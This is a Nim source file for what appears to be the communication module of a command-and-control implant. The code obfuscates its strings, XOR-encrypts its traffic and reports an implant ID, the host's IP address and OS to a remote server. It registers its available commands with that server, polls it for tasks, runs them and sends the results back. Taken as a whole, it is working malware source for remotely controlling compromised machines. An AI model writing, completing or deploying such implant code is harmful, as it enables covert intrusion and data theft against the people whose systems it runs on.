import httpClient
import json
import net

import config
import commands
import utils

const
    ACTION_CHECKIN*: int = 1
    ACTION_REGISTER*: int = 2
    ACTION_TASK_RESULT*: int = 3

    STATUS_ERROR*: int = 0
    STATUS_CONTINUE*: int = 1
    STATUS_TASKS*: int = 2
    STATUS_REGISTER*: int = 3
    STATUS_INVALID*: int = 4

let client: HttpClient = newHttpClient()
client.headers = newHttpHeaders({obf("User-Agent"): USER_AGENT, obf("Content-Type"): obf("application/json")})

let ip: string = $getPrimaryIPAddr()

when defined(windows):
    var os: string = obf("windows")

when defined(linux):
    var os: string = obf("linux")

proc xorData(plain: string, key: string): string =
    result = newString(plain.len)

    for i in 0 ..< plain.len:
        let plainByte = ord(plain[i])
        let keyByte = ord(key[i mod key.len])
        result[i] = chr(plainByte xor keyByte)

    return result

proc sendRegistration*(commands: seq[Command]): int =
    var payload: JsonNode = %*{
        obf("implant_id"): IMPLANT_ID,
        obf("ip"): ip,
        obf("action"): ACTION_REGISTER,
        obf("registration"):  %*{
           obf( "os"): os,
            obf("commands"): []
        }
    }

    for command in commands:
        var commandJson: JsonNode = %*{
            obf("command"): command.command,
            obf("description"): command.description,
            obf("args"): command.args
        }
        payload[obf("registration")][obf("commands")].add(commandJson)

    var encPayload: string = xorData($payload, XOR_KEY)

    var response: string
    var responseJson: JsonNode

    try:
        response = client.postContent(SERVER_BASE_URL, encPayload)
        responseJson = parseJson(xorData(response, XOR_KEY))
    except:
        raise newException(ValueError, obf("Invalid registration response"))

    if responseJson[obf("status")].getInt in @[STATUS_ERROR, STATUS_CONTINUE, STATUS_TASKS, STATUS_REGISTER, STATUS_INVALID]:
        return responseJson[obf("status")].getInt
    else:
        raise newException(ValueError, obf("Invalid respose status code"))

proc sendTaskResult*(taskId: string, taskResult: string): int = 
    var payload: JsonNode = %*{
        obf("implant_id"): IMPLANT_ID,
        obf("ip"): ip,
        obf("action"): ACTION_TASK_RESULT,
        obf("result"): {
            obf("task_id"): task_id,
            obf("result"): taskResult
        }
    }

    var encPayload: string = xorData($payload, XOR_KEY)

    var response: string = client.postContent(SERVER_BASE_URL, encPayload)
    var responseJson: JsonNode = parseJson(xorData(response, XOR_KEY))

    return responseJson[obf("status")].getInt

proc checkin*(): void =
    var payload: JsonNode = %*{
        obf("implant_id"): IMPLANT_ID,
        obf("ip"): ip,
        obf("action"): ACTION_CHECKIN 
    }

    var encPayload: string = xorData($payload, XOR_KEY)

    let response: string = client.postContent(SERVER_BASE_URL, encPayload)
    let responseJson: JsonNode = parseJson(xorData(response, XOR_KEY))
    
    when not defined(release):
        echo "Recieved checkin status: " & $responseJson[obf("status")].getInt

    case responseJson[obf("status")].getInt
        of STATUS_CONTINUE:
            discard
        of STATUS_INVALID:
            raise newException(ValueError, obf("Data sent to server was invalid"))
        of STATUS_REGISTER:
            try:
                discard sendRegistration(commands.commands)
            except:
                discard
        of STATUS_TASKS:
            var tasks: seq[JsonNode] = responseJson[obf("tasks")].getElems

            when not defined(release):
                echo "Recieved tasks: " & $tasks
            
            for task in tasks:
                for command in commands.commands:
                    if command.command == task[obf("task")].getStr:
                        var taskResult: string = command.function(task)
                        var taskResultStatus: int = sendTaskResult(task["task_id"].getStr, taskResult)

                        if not defined(release):
                            echo "Sent task results for task " & task["task_id"].getStr & " and got status " & $taskResultStatus

        else:
            raise newException(ValueError, obf("Invalid respose status code"))
